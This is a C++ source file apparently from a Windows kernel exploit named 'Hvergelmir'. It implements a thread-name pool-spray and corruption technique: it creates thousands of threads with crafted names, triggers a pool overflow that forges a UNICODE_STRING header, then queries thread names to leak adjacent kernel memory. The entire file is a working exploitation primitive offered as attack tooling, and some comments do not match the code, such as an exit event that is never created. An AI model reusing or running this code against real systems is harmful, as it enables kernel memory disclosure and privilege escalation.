
#include "ThreadNameManager.h"
#include "Hvergelmir.h"

// exitEvent is created once in the constructor to ensure proper error handling
static HANDLE exitEvent = NULL;

DWORD WINAPI DummyThread(LPVOID lpParam) {
	// Wait on event; if event handle is invalid just exit
	if (exitEvent == NULL) return 0;
	WaitForSingleObject(exitEvent, INFINITE);
	return 0;
}


ThreadNameManager::ThreadNameManager()
{
	leakThread = NULL;
	nameSize = NULL;

	HMODULE ntDLL = GetModuleHandleA("ntdll.dll");

	if (!ntDLL)
	{
         DEBUG_PRINT(" [!] Could not get NTDLL for ThreadNameManager\n");
		return;
	}

	_NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(ntDLL, "NtSetInformationThread");
	_NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(ntDLL, "NtQueryInformationThread");


}


bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 maxRetries)
{
    if (iChunkSize <= offsetof(UNICODE_STRING, Buffer) + 0x20) {
		DEBUG_PRINT(" [!] Invalid chunk size\n");
		return false;
	}
	nameSize = iChunkSize - offsetof(UNICODE_STRING, Buffer) - 0x20;
	leakThread = NULL;

	leakSize = iLeakSize;

	DEBUG_PRINT("\n [*] ###### Corrupting ThreadName to Leak Data (VOLATILE) ######\n");

	ThreadNameOverflow tnOverflow;

	tnOverflow.poolHeader.poolTag = 0x6d4e6854;
	tnOverflow.threadName.Length = nameSize + leakSize;
	tnOverflow.threadName.MaximumLength = nameSize + leakSize;


	for (UINT64 i = 0; i < maxRetries; i++)
	{
		CreateThreads(3000);
		//nameManager.FreeSlots(1000, 6);

		Hvergelmir::getInstance().PrimeOverflow(iChunkSize);
		Hvergelmir::getInstance().TriggerOverflow((BYTE*)&tnOverflow, 0x24);

		leakThread = ScanForCorruptName();

		if (leakThread)
		{
          DEBUG_PRINT(" [*] ###### Found ThreadName Overwrite ######\n");
			CleanExtraThreads();
			return true;
		}
        DEBUG_PRINT("       Retrying Pool Layout\n");
		ClearThreads();

	}
	DEBUG_PRINT(" [!] Failed to Corrupt ThreadName, Likelyhood of BSOD is HIGH! Exiting\n");
	return false;
}



void ThreadNameManager::CreateThreads(UINT64 iThreadCount)
{
    // Guard against invalid nameSize or missing APIs
	if (nameSize == 0 || !_NtSetInformationThread) return;

	// Prepare payload and THREAD_NAME_INFORMATION
	std::vector<WCHAR> payload(nameSize / sizeof(WCHAR));
	std::fill(payload.begin(), payload.end(), L'A');

	THREAD_NAME_INFORMATION threadName = { 0 };
	threadName.ThreadName.Buffer = payload.data();
	threadName.ThreadName.Length = (USHORT)nameSize;
	threadName.ThreadName.MaximumLength = (USHORT)nameSize;

	threadCount = iThreadCount;
	threads = (HANDLE*)calloc((size_t)iThreadCount, sizeof(HANDLE));
	if (!threads) {
		DEBUG_PRINT(" [!] Failed to allocate thread handles array\n");
		return;
	}

	for (UINT64 i = 0; i < iThreadCount; i++) {
		HANDLE h = CreateThread(NULL, 0, DummyThread, NULL, STACK_SIZE_PARAM_IS_A_RESERVATION, NULL);
		if (h == NULL) {
			DEBUG_PRINT(" [!] CreateThread failed at index %llu\n", i);
			threads[i] = NULL;
			continue;
		}
		threads[i] = h;

		// Only call if function pointer is valid
		if (_NtSetInformationThread) {
			_NtSetInformationThread(threads[i], ThreadNameInformation, &threadName, sizeof(threadName));
		}
	}
}


HANDLE ThreadNameManager::ScanForCorruptName()
{
	ULONG returnLength = 0;
    if (!_NtQueryInformationThread || nameSize == 0) return NULL;

	std::vector<BYTE> buffer((size_t)(nameSize + leakSize));

	for (UINT64 i = 0; i < threadCount; i++)
	{
		if (threads[i] == NULL) continue;

		NTSTATUS status = _NtQueryInformationThread(threads[i], ThreadNameInformation, buffer.data(), (ULONG)buffer.size(), &returnLength);
		if (!NT_SUCCESS(status)) continue;

		if (returnLength > nameSize + 0x10) {
			leakThread = threads[i];
			return threads[i];
		}
	}
	return NULL;
}

BYTE* ThreadNameManager::LeakData()
{
    if (!leakThread) {
		DEBUG_PRINT(" [!] Leak Thread has not yet been Located!\n");
		return NULL;
	}

	size_t bufSize = nameSize + leakSize * 2;
	std::vector<BYTE> data(bufSize);
	std::vector<BYTE> output(bufSize);
	ULONG returnLength = 0;

	if (!_NtQueryInformationThread) return NULL;

	NTSTATUS status = _NtQueryInformationThread(leakThread, ThreadNameInformation, data.data(), (ULONG)bufSize, &returnLength);
	if (!NT_SUCCESS(status) || returnLength < nameSize + 0x10) {
		DEBUG_PRINT(" [!] Data Leak Failed!\n");
		return NULL;
	}

    size_t copyLen = 0;
	if (returnLength > (ULONG)nameSize) copyLen = (size_t)(returnLength - (ULONG)nameSize);
	memcpy(output.data(), data.data() + nameSize + 0x18, copyLen);

	// return a heap buffer that caller must free
	BYTE* ret = (BYTE*)malloc(copyLen);
	if (!ret) return NULL;
	memcpy(ret, output.data(), copyLen);
	return ret;
}


void ThreadNameManager::FreeSlots(UINT64 iStartCount, UINT64 iInterval)
{
	// Free every nth thread slot to create holes in the pool
	THREAD_NAME_INFORMATION emptyThreadName = { 0 };
	if (!_NtSetInformationThread || threadCount == 0) return;
	for (UINT64 i = iStartCount; i < threadCount; i += iInterval) {
		if (threads[i] == NULL) continue;
		_NtSetInformationThread(threads[i], ThreadNameInformation, &emptyThreadName, sizeof(emptyThreadName));
	}
}

void ThreadNameManager::CleanExtraThreads()
{

    if (!leakThread)
	{
		DEBUG_PRINT(" [!] Leak Thread not yet Found, Cant Clean Threads\n");
		return;
	}


	THREAD_NAME_INFORMATION emptyThreadName = { 0 };

	for (int i = 0; i < threadCount; i += 1) {
		if (leakThread != threads[i])
			_NtSetInformationThread(threads[i], ThreadNameInformation, &emptyThreadName, sizeof(emptyThreadName));
	}

}


void ThreadNameManager::ClearThreads()
{
    if (exitEvent) SetEvent(exitEvent);

	if (threadCount > 0 && threads) {
		WaitForMultipleObjects((DWORD)threadCount, threads, TRUE, INFINITE);

		for (UINT64 i = 0; i < threadCount; i++) {
			if (threads[i] != NULL && threads[i] != INVALID_HANDLE_VALUE) {
				CloseHandle(threads[i]);
				threads[i] = NULL;
			}
		}
		free(threads);
		threads = NULL;
	}
}